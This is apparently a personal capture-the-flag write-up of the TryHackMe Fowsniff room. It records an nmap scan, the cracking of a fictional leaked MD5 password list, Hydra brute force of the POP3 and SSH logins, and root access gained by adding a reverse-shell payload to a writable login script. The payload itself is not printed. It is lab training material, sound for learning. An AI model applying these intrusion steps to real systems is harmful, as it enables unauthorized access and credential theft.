---
title: "Fowsniff-CTF"
tags:
  - fetus
---
- room link: https://tryhackme.com/room/ctf
## nmap results:
```sh
# Nmap 7.95 scan initiated Fri Aug 22 17:32:37 2025 as: /usr/lib/nmap/nmap -Pn -sCV -T4 -oN Dscan.txt 10.201.66.111
Nmap scan report for 10.201.66.111
Host is up (0.37s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES CAPA SASL(PLAIN) USER PIPELINING AUTH-RESP-CODE TOP UIDL
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: OK IMAP4rev1 SASL-IR Pre-login LITERAL+ have ID ENABLE listed capabilities more IDLE post-login LOGIN-REFERRALS AUTH=PLAINA0001
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 22 17:33:15 2025 -- 1 IP address (1 host up) scanned in 38.06 seconds
```
## http enum
- seems like they got fucked <br>
![[Fowsniff-CTFWebIsDownSS.png]]
- twitter handle is `@fowsniffcorp` lets visit that and get some creds 
- `https://x.com/fowsniffcorp`
- the pastebins are unavailable. one tweet with creds is available tho <br>
![[Fowsniff-CTFTweetSS.png]]
- tried to crack it with hashcat since [[hash-identifier]] and `dcode.fr` said MD5 although a low chance at MD5 
```
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
```
- didnt work. im fucking stuck. 
- checked a walkthrough. the pastebin is essential to continue and its fucking gone -\_\_- smh. lets copy it from somewhere
- nvm shouldve checked the hint first. lets get it from `https://github.com/berzerk0/Fowsniff`
```sh
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.

-------------------------------------------------------------------------------------------------
```
- seperated creds list:
```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```
- seperated hashlist:
```sh
8a28a94a588a95b80163709ab4313aa4
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352435fecca338acfd4be10984009
19f5af754c31f1e2651edde9250d69bb
90dc16d47114aa13671c697fd506cf26
a92b8a29ef1183192e3d35187e0cfabd
0e9588cb62f4b6f27e33d449e2ba0b3b
4d6e42f56e127803285a0a7649b5ab11
f7fd98d380735e859f8b2ffbbede5a7e
```
- cracked hashes from crackstation.net:
```sh
8a28a94a588a95b80163709ab4313aa4:mailcall
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
1dc352435fecca338acfd4be10984009:apples01
19f5af754c31f1e2651edde9250d69bb:skyler22
90dc16d47114aa13671c697fd506cf26:scoobydoo2
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
4d6e42f56e127803285a0a7649b5ab11:orlando12
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```
<br>
![[Fowsniff-CTFCrackStationSS.png]]
- newCredslist:
```sh
mauer:mailcall
mustikka:bilbo101
tegel:apples01
baksteen:skyler22
seina:scoobydoo2
mursten:carp4ever
parede:orlando12
sciana:07011972
```
## [[pop3]] enumeration
- ran hydra. got creds 
```sh
seina:scoobydoo2
```
- logged into POP3. two messages <br>
![[Fowsniff-CTFpop3TwoMessagesSS.png]]
- message 1:
```c
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```
- message 2:
```c
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```
- noice new creds for ssh xD
```
seina:S1ck3nBluff+secureshell
```
## ssh access
- seina didnt work. imma just hydra it with all the unames
```sh
╭─[~/projects/fowsniff-CTF]─[root@DEMONDAYZ]─[0]─[3917]
╰─[:)] # hydra -L unames -P sshTempPass $ip ssh -v 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-23 21:17:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://10.201.125.193:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://mauer@10.201.125.193:22
[INFO] Successful, password authentication is supported by ssh://10.201.125.193:22
[22][ssh] host: 10.201.125.193   login: baksteen   password: S1ck3nBluff+secureshell
[STATUS] attack finished for 10.201.125.193 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-23 21:17:48
```
- ssh creds:
```
baksteen:S1ck3nBluff+secureshell
```
- woohooo we're innn <br>
![[Fowsniff-CTFSshINSS.png]]
- seems like user `stone` is a privileged user. might wanna move to that later. gonna keep that in my pocket for now :D
- `term.txt` in home: <br>
![[Fowsniff-CTFtermTxtSS.png]]
- who came up with it? google gives mixed results. `Dick Clark`, `Andy Mellen` are some names that came up but no concrete proof of them being the inventors
- gonna run `linpeas.sh` now :3 <br>
![[Fowsniff-CTFLinpeasInterestingOutputSS.png]]
- path has been edited 
```c
/home/baksteen/bin:/home/baksteen/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
- wasnt anything interesting in it. tryhackme asks what interesting files can our group run. did `find / -group baksteen 2>/dev/null` but it didnt return anything 
- oh we have 2 groups 
- did `find / -group users 2>/dev/null`. returned a shitton of results. most of it is junk. did some unusual stuff at the top including linpeas:
```sh
/tmp/linpeas.sh
/tmp/usersFiles
/opt/cube/cube.sh
```
- i created linpeas and usersFiles when saving the results of the find result. `cube.sh` seems interesting. `cube.sh` perms:
```sh
-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
```
- i got `rwx` perms :o lets see what it does
```sh
baksteen@fowsniff:/tmp$ cat /opt/cube/cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```
- lets modify it
- [[mousepad]] isnt available. gotta use [[vim]] -,- lets add a reverse connection payload with [[oneLinerShells]] and run a listener on my end to receive the connection and run the damn thing
- doesnt work i only get a shell as baksteen back. 
- oh the file only gets run as root whenever a user logs in through ssh. my dumbass does NOT have a brain lmao <br>
![[Fowsniff-CTFHasBeenRooted.png]]
- hell yeah simulator :D